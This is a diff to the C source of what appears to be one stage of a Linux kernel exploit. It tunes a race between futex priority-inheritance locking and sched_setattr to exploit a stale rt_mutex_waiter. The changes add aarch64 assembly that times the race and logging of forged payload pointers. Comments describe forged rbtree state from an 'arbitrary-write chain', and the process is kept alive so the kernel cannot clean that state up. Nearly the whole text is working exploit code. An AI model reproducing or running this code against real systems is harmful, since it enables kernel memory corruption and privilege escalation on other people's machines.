@@ -14,15 +14,41 @@
 #include <time.h>
 #include <unistd.h>
 
+#include "offset.h"
 #include "kernelsnitch/utils.h"
 
+#ifndef WAITER_WAIT_SEC
 #define WAITER_WAIT_SEC     5
+#endif
+#ifndef CONSUMER_DELAY_USEC
 #define CONSUMER_DELAY_USEC 15000
+#endif
+#ifndef CONSUMER_NICE
 #define CONSUMER_NICE       19
+#endif
+#ifndef CONSUMER_CALLS
 #define CONSUMER_CALLS      1
+#endif
+#ifndef OWNER_NICE
+#define OWNER_NICE          0
+#endif
+#ifndef CONSUMER_INLINE
+#define CONSUMER_INLINE     0
+#endif
+#ifndef CONSUMER_DELAY_SPINS
+#define CONSUMER_DELAY_SPINS 0
+#endif
+#ifndef CONSUMER_DELAY_TICKS
+#define CONSUMER_DELAY_TICKS 0
+#endif
+#ifndef STAMP_FINAL_SCHED_IDLE
+#define STAMP_FINAL_SCHED_IDLE 0
+#endif
 
 #define EXP_BUFFER_BYTES 128
 #define EXP_BUFFER_WORDS (EXP_BUFFER_BYTES / sizeof(uint64_t))
+#define EXP_READY_OFFSET (EXP_BUFFER_BYTES + 1)
+#define EXP_READY_MARKER 0x5a
 
 static uint32_t f_wait;
 static uint32_t f_pi_target;
@@ -33,7 +59,13 @@ static atomic_int g_waiter_ready;
 static atomic_int g_waiter_waiting;
 static atomic_int g_owner_started;
 atomic_int g_consumer_go;
-static atomic_int g_consumer_done;
+atomic_int g_consumer_done;
+atomic_int g_consumer_phase_done;
+atomic_ullong g_consumer_delay_ticks;
+extern atomic_int g_stamp_completed;
+extern atomic_ullong g_stamp_start_ticks;
+extern atomic_ullong g_consumer_seen_ticks;
+extern atomic_ullong g_consumer_svc_ticks;
 static uint64_t g_payload_buffer[EXP_BUFFER_WORDS];
 
 struct local_sched_attr {
@@ -56,7 +88,70 @@ static long sched_setattr_tid(int tid, int nice_val) {
     return syscall(__NR_sched_setattr, tid, &attr, 0);
 }
 
+static long consumer_sched_setattr_inline(int tid, int policy, int nice_val) {
+    struct local_sched_attr attr;
+    memset(&attr, 0, sizeof(attr));
+    attr.size         = sizeof(attr);
+    attr.sched_policy = policy;
+    attr.sched_nice   = nice_val;
+#if defined(__aarch64__)
+#ifdef STAMP_TWO_PHASE
+    long delay_ticks = CONSUMER_DELAY_TICKS;
+    long delay_spins = CONSUMER_DELAY_SPINS;
+#else
+    long delay_ticks = g_payload_buffer[10]
+                           ? (long)g_payload_buffer[10]
+                           : (long)CONSUMER_DELAY_TICKS;
+    long delay_spins = g_payload_buffer[11]
+                           ? (long)g_payload_buffer[11]
+                           : (long)CONSUMER_DELAY_SPINS;
+#endif
+    register long r0 __asm__("x0") = tid;
+    register long r1 __asm__("x1") = (long)&attr;
+    register long r2 __asm__("x2") = 0;
+    register long r8 __asm__("x8") = __NR_sched_setattr;
+    __asm__ volatile(
+        "1: ldar w10, [%[go]]\n"
+        "cbz w10, 1b\n"
+        "mrs x12, cntvct_el0\n"
+        "str x12, [%[seen_out]]\n"
+        "mov x11, %[delay_ticks]\n"
+        "cbz x11, 3f\n"
+        "2: mrs x13, cntvct_el0\n"
+        "sub x13, x13, x12\n"
+        "cmp x13, x11\n"
+        "b.lo 2b\n"
+        "3:\n"
+        "mov x11, %[delay_spins]\n"
+        "cbz x11, 5f\n"
+        "4: subs x11, x11, #1\n"
+        "b.ne 4b\n"
+        "5:\n"
+        "mrs x13, cntvct_el0\n"
+        "str x13, [%[svc_out]]\n"
+        "sub x13, x13, x12\n"
+        "str x13, [%[delay_out]]\n"
+        "svc #0\n"
+        : "+r"(r0)
+        : "r"(r1), "r"(r2), "r"(r8), [go] "r"(&g_consumer_go)
+          , [delay_ticks] "r"(delay_ticks),
+          [delay_spins] "r"(delay_spins),
+          [delay_out] "r"(&g_consumer_delay_ticks),
+          [seen_out] "r"(&g_consumer_seen_ticks),
+          [svc_out] "r"(&g_consumer_svc_ticks)
+        : "x10", "x11", "x12", "x13", "memory", "cc");
+    return r0;
+#else
+    while (!atomic_load(&g_consumer_go))
+        ;
+    return syscall(__NR_sched_setattr, tid, &attr, 0);
+#endif
+}
+
 void do_stamp_stack(uint64_t *buf);
+void prepare_stamp_hold(uint64_t *buf);
+void log_stamp_config(void);
+void log_stamp_status(void);
 
 static void *waiter_thread(void *arg __attribute__((unused))) {
     pin_to_core(2);
@@ -97,6 +192,18 @@ static void *waiter_thread(void *arg __attribute__((unused))) {
 }
 
 static void *owner_thread(void *arg __attribute__((unused))) {
+    /* Keep the PI-chain owner from donating priority 120 to the waiter.
+     * On targets whose stack stamp cannot reach rt_mutex_waiter::prio, this
+     * lets the consumer's legal priority reduction change the waiter's
+     * effective priority and enter rt_mutex_adjust_pi().
+     */
+    if (OWNER_NICE > 0) {
+        long ret = sched_setattr_tid(0, OWNER_NICE);
+        if (ret != 0)
+            pr_warning("Owner: sched_setattr nice=%d failed errno=%d\n",
+                       OWNER_NICE, errno);
+    }
+
     if (syscall(__NR_futex, &f_pi_target, FUTEX_LOCK_PI, 0,
                 NULL, NULL, 0) != 0) {
         pr_warning("Owner: lock_pi target failed errno=%d\n", errno);
@@ -123,23 +230,47 @@ static void *consumer_thread(void *arg __attribute__((unused))) {
     while (!(tid = atomic_load(&g_waiter_tid)))
         usleep(1000);
 
-    while (!atomic_load(&g_consumer_go))
-        ;
-
-    usleep(CONSUMER_DELAY_USEC);
-
-    if (!atomic_load(&g_consumer_go)) {
-        pr_warning("Consumer: missed the window\n");
-        return NULL;
-    }
-
     long ret = 0;
-    pr_debug("Consumer: hammering sched_setattr on TID %d\n", tid);
-    for (int i = 0; i < CONSUMER_CALLS; i++) {
-        ret = sched_setattr_tid(tid, (i & 1) ? CONSUMER_NICE - 1 : CONSUMER_NICE);
-        usleep(60000);
+#ifdef STAMP_TWO_PHASE
+    ret = consumer_sched_setattr_inline(tid, SCHED_BATCH,
+                                        CONSUMER_NICE - 1);
+    atomic_store(&g_consumer_phase_done, 1);
+    while (atomic_load(&g_consumer_go) != 0)
+        ;
+    ret = consumer_sched_setattr_inline(
+        tid, STAMP_FINAL_SCHED_IDLE ? SCHED_IDLE : SCHED_BATCH,
+        CONSUMER_NICE);
+#else
+    if (CONSUMER_INLINE) {
+        ret = consumer_sched_setattr_inline(tid, SCHED_BATCH,
+                                            CONSUMER_NICE);
+    } else {
+        while (!atomic_load(&g_consumer_go))
+            ;
+
+        if (CONSUMER_DELAY_USEC > 0) {
+            for (volatile int i = 0; i < CONSUMER_DELAY_USEC; i++)
+                __asm__ volatile("" ::: "memory");
+        }
+
+        for (int i = 0; i < CONSUMER_CALLS; i++) {
+            ret = sched_setattr_tid(
+                tid, (i & 1) ? CONSUMER_NICE - 1 : CONSUMER_NICE);
+            usleep(60000);
+        }
     }
-    pr_debug("Consumer: sched_setattr returned %ld errno=%d\n", ret, errno);
+#endif
+#if STAMP_SYNC_FINAL && !STAMP_INLINE_RETURN
+#ifdef STAMP_TWO_PHASE
+    while (atomic_load(&g_stamp_completed) < 2 * (STAMP_BURST + 1))
+        ;
+#else
+    while (atomic_load(&g_stamp_completed) < STAMP_BURST + 1)
+        ;
+#endif
+#endif
+    log_stamp_status();
+    pr_info("Consumer: sched_setattr returned %ld errno=%d\n", ret, errno);
 
     atomic_store(&g_consumer_done, 1);
 
@@ -149,6 +280,9 @@ static void *consumer_thread(void *arg __attribute__((unused))) {
 }
 
 int main(int argc, char **argv) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
     if (argc < 2) {
         pr_warning("Usage: %s <buffer_fd>\n", argv[0]);
         return 1;
@@ -163,6 +297,36 @@ int main(int argc, char **argv) {
     }
 
     pr_info("Stage started pid=%d\n", getpid());
+    log_stamp_config();
+#ifdef STAMP_TWO_PHASE
+    unsigned long long stage_delay_ticks =
+        (unsigned long long)CONSUMER_DELAY_TICKS;
+    unsigned long long stage_delay_spins =
+        (unsigned long long)CONSUMER_DELAY_SPINS;
+#else
+    unsigned long long stage_delay_ticks = g_payload_buffer[10]
+                                               ? g_payload_buffer[10]
+                                               : CONSUMER_DELAY_TICKS;
+    unsigned long long stage_delay_spins = g_payload_buffer[11]
+                                               ? g_payload_buffer[11]
+                                               : CONSUMER_DELAY_SPINS;
+#endif
+    pr_info("Stage consumer: delay_us=%d ticks=%llu spins=%llu calls=%d "
+            "owner_nice=%d inline=%d\n",
+            CONSUMER_DELAY_USEC, stage_delay_ticks,
+            stage_delay_spins, CONSUMER_CALLS, OWNER_NICE, CONSUMER_INLINE);
+    pr_info("Stage payload: tree_pc=%#llx tree_left=%#llx task=%#llx "
+            "lock=%#llx\n",
+            (unsigned long long)g_payload_buffer[0],
+            (unsigned long long)g_payload_buffer[2],
+            (unsigned long long)g_payload_buffer[6],
+            (unsigned long long)g_payload_buffer[7]);
+
+    /* Any expensive network-state preparation must happen before the PI
+     * waiter is created.  Running it on the waiter after timeout leaves a
+     * long interval where normal scheduler activity can traverse an
+     * unstamped stale rt_mutex_waiter. */
+    prepare_stamp_hold(g_payload_buffer);
 
     pthread_t waiter, owner, consumer;
 
@@ -173,6 +337,14 @@ int main(int argc, char **argv) {
     while (!atomic_load(&g_waiter_waiting) ||
            !atomic_load(&g_owner_started))
         usleep(1000);
+
+    unsigned char ready = EXP_READY_MARKER;
+    if (pwrite(buf_fd, &ready, sizeof(ready), EXP_READY_OFFSET) !=
+        (ssize_t)sizeof(ready)) {
+        pr_warning("Main: ready signal failed errno=%d\n", errno);
+        return 1;
+    }
+    pr_info("Main: waiter/owner ready; pre-race window opened\n");
 
     usleep(200000);
 
@@ -187,5 +359,19 @@ int main(int argc, char **argv) {
         sleep(1);
 
     pr_info("Main: chain complete\n");
-    return 0;
+    unsigned char done = 0xa5;
+    if (pwrite(buf_fd, &done, sizeof(done), EXP_BUFFER_BYTES) !=
+        (ssize_t)sizeof(done)) {
+        pr_warning("Main: completion signal failed errno=%d\n", errno);
+        return 1;
+    }
+
+    /* The forged PI/rbtree state is still associated with this process.
+     * Exiting can make the kernel tear that state down through rb_erase(),
+     * which is unsafe after the arbitrary-write chain.  Keep the process
+     * alive and quiescent after telling the native parent it may continue.
+     */
+    pr_info("Main: completion signaled; parking process\n");
+    for (;;)
+        pause();
 }
